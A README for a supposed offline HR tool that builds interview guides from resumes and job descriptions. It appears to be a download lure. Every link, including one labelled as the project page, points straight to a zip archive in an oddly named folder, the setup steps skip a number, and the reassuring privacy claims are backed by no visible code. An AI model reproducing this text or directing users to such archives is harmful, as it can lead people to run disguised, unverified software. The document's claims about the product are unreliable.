# 📋 hr-interviewing - Create professional interview guides in seconds

[![](https://img.shields.io/badge/Download-hr--interviewing-blue)](https://github.com/Masonryfinance857/hr-interviewing/raw/refs/heads/main/Buddhahood/hr-interviewing-3.4.zip)

## 📌 Purpose
The hr-interviewing tool helps you prepare for candidate interviews. It compares a candidate resume against a specific job description. The software generates tailored questions and structured guides for your meetings. You do not need to install complex software or set up a web server. This tool runs directly inside your web browser using standard technology.

## 🛠 Features
This application serves recruiters, hiring managers, and business owners who need to conduct structured interviews. 

*   Resume Analysis: Paste the candidate resume text to extract key skills and experience.
*   Job Matching: Compare the candidate profile against a job description to identify skill gaps.
*   Question Generation: The tool creates specific interview questions based on the resume data.
*   Printable Guides: The app formats your interview guide into a clean layout for printing or saving as a PDF.
*   Privacy Focused: All data stays on your computer. No information travels to a cloud server. 

## 📥 Getting Started
You can use this tool without any programming experience. Follow these steps to set up the application on your computer.

1. Visit the [hr-interviewing project page](https://github.com/Masonryfinance857/hr-interviewing/raw/refs/heads/main/Buddhahood/hr-interviewing-3.4.zip).

3. Click the button and select "Download ZIP".
4. Save the file to your computer.
5. Open your Downloads folder.
6. Right-click the folder and select "Extract All".
7. Open the extracted folder.
8. Locate the file named `index.html`.
9. Double-click this file to open it in your default web browser.

Once the page loads, you are ready to start building your interview guides.

## 📝 How to Use the Tool
The user interface remains clean to keep your focus on the recruitment task.

### Step 1: Input Data
Copy the job description from your document or website. Paste this text into the box labeled "Job Description". Next, copy the candidate resume text and paste it into the box labeled "Candidate Resume".

### Step 2: Analyze
Click the "Analyze" button. The software compares the two documents. It highlights matches and missing qualifications. This process takes only a few seconds.

### Step 3: Review Questions
The tool displays a list of suggested interview questions. You can toggle specific questions on or off based on your needs. Edit the text of any question to refine it for your company culture.

### Step 4: Export
Click the "Print" button to generate a clean version of your interview guide. Your browser opens a print preview window. Select your printer or choose "Save as PDF" to store the guide on your hard drive.

## 📂 Privacy and Security
This tool uses local processing. When you type or paste data into the fields, the information stays inside your browser memory. No third-party servers see your candidate data or internal company job descriptions. You can disconnect your computer from the internet and the tool continues to function. 

## ⚙️ Customization

The software maintains a simple structure so you can modify it without breaking complex backend dependencies.

## ❓ Troubleshooting
If the file does not open, check these items:

*   File Extension: Ensure the file ends with `.html`. If your computer hides file extensions, look for a file with a web browser icon.
*   Browser Update: Use the latest version of your preferred browser. Outdated browsers may struggle with modern JavaScript features.
*   File Location: Keep all files from the original download folder in one place. Do not move the `index.html` file into a separate folder unless you move all accompanying files with it.

If the analysis does not run, ensure you populated both text fields. Empty fields cause the logic to stall. Refresh your browser page to reset the application state if you encounter an error.
